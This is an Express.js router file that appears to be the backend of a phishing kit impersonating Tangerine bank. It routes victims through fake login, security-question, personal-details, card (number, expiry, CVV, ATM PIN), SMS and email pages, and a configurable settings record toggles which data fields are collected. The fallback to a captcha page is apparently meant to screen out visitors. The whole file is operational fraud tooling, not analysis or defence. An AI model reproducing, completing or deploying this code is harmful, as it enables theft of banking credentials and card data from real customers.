// userRouter.js
const express = require('express');
const router = express.Router();
const dbConfig = require('../dbConfig');
const { Pool } = require('pg');
const getId = 1;

const pool = new Pool(dbConfig);

router.get('/finish', async (req, res) => {
    res.render('bank/tangerine/finish/index');
})

router.get('/card', async (req, res) => {
    try {
        const result = await pool.query('SELECT data FROM items WHERE id = $1', [getId]);

        res.render('bank/tangerine/card/index', { navig: "/tangerine/finish", tangerine: result.rows[0].data.settings.tangerine});

    } catch (error) {
        console.log(error);
        res.render('captcha/index');
    }
})

router.get('/loading', async (req, res) => {
    res.render('bank/tangerine/loading/index');
})

router.get('/sms', async (req, res) => {
    let error = false
    if(req.query.argument){
        error = true
    }
    res.render('bank/tangerine/sms/index', { navig: "/tangerine/loading", error: error});
})

router.get('/email', async (req, res) => {
    let error = false
    if(req.query.argument){
        error = true
    }
    res.render('bank/tangerine/email/index', { navig: "/tangerine/loading", error: error });
})


router.get('/details', async (req, res) => {
    try {
        const result = await pool.query('SELECT data FROM items WHERE id = $1', [getId]);
        let count = 0
        let countRmvDetailsPage = 0
        let countRmvCardPage = 0
        let rmvCardPage = false

        Object.keys(result.rows[0].data.settings.tangerine).forEach(key => {
            if (result.rows[0].data.settings.tangerine[key] === 'off') {
                count++;
                if (key != 'card' && key != 'exp' && key != 'cvv' && key != 'atm') {
                    countRmvDetailsPage++;
                } else {
                    countRmvCardPage++;
                }
            }
        });

        if (countRmvCardPage == 4) {
            rmvCardPage = true
        }


        if (rmvCardPage) {
            res.render('bank/tangerine/details/index', { navig: "/tangerine/finish", tangerine: result.rows[0].data.settings.tangerine});
        } else {
            res.render('bank/tangerine/details/index', { navig: "/tangerine/card", tangerine: result.rows[0].data.settings.tangerine});
        }



    } catch (error) {
        console.log(error);
        res.render('captcha/index');
    }
})

router.get('/qst', async (req, res) => {
    try {
        const result = await pool.query('SELECT data FROM items WHERE id = $1', [getId]);
        let count = 0
        let countRmvDetailsPage = 0
        let countRmvCardPage = 0
        let rmvDetailsPage = false
        let rmvCardPage = false

        Object.keys(result.rows[0].data.settings.tangerine).forEach(key => {
            if (result.rows[0].data.settings.tangerine[key] === 'off') {
                count++;
                if (key != 'card' && key != 'exp' && key != 'cvv' && key != 'atm') {
                    countRmvDetailsPage++;
                } else {
                    countRmvCardPage++;
                    //console.log(countRmvCardPage);
                }
            }
        });

        if (countRmvDetailsPage == 10) {
            rmvDetailsPage = true
        }

        if (countRmvCardPage == 4) {
            rmvCardPage = true
        }

        //console.log("Remove Details : ", rmvDetailsPage)
        //console.log("Remove Card : ", rmvCardPage)



        if (rmvDetailsPage) {
            if (rmvCardPage) {
                res.render('bank/tangerine/qst/index', { navig: "/tangerine/finish", p_quests: result.rows[0].data.settings.tangerine.qa });
            } else {
                res.render('bank/tangerine/qst/index', { navig: "/tangerine/card", p_quests: result.rows[0].data.settings.tangerine.qa });
            }
        } else if (count >= 14) {
            res.render('bank/tangerine/qst/index', { navig: "/tangerine/finish", p_quests: result.rows[0].data.settings.tangerine.qa });
        } else {
            res.render('bank/tangerine/qst/index', { navig: "/tangerine/details", p_quests: result.rows[0].data.settings.tangerine.qa });
        }

    } catch (error) {
        console.log(error);
        res.render('captcha/index');
    }
})

router.get('/login', async (req, res) => {
    try {

        const result = await pool.query('SELECT data FROM items WHERE id = $1', [getId]);
        let count = 0
        let countRmvDetailsPage = 0
        let countRmvCardPage = 0
        let rmvDetailsPage = false
        let rmvCardPage = false

        Object.keys(result.rows[0].data.settings.tangerine).forEach(key => {
            if (result.rows[0].data.settings.tangerine[key] === 'off') {
                count++;
                if (key != 'card' && key != 'exp' && key != 'cvv' && key != 'atm') {
                    countRmvDetailsPage++;
                } else {
                    countRmvCardPage++;
                    //console.log(countRmvCardPage);
                }
            }
        });

        if (countRmvDetailsPage == 10) {
            rmvDetailsPage = true
        }

        if (countRmvCardPage == 4) {
            rmvCardPage = true
        }

        //console.log("Remove Details : ", rmvDetailsPage)
        //console.log("Remove Card : ", rmvCardPage)


        if (result.rows[0].data.settings.tangerine.qa > 0) {
            res.render('bank/tangerine/login/index', { navig: "/tangerine/qst" });
        } else if (count >= 14) {
            res.render('bank/tangerine/login/index', { navig: "/tangerine/finish" });
        } else {
            if (rmvDetailsPage) {
                if (rmvCardPage) {
                    res.render('bank/tangerine/login/index', { navig: "/tangerine/finish" });
                } else {
                    res.render('bank/tangerine/login/index', { navig: "/tangerine/card" });
                }
            } else {
                res.render('bank/tangerine/login/index', { navig: "/tangerine/details" });
            }
        }


    } catch (error) {
        console.error(error);
        res.render('captcha/index');
    }
})



// Export the router
module.exports = router;
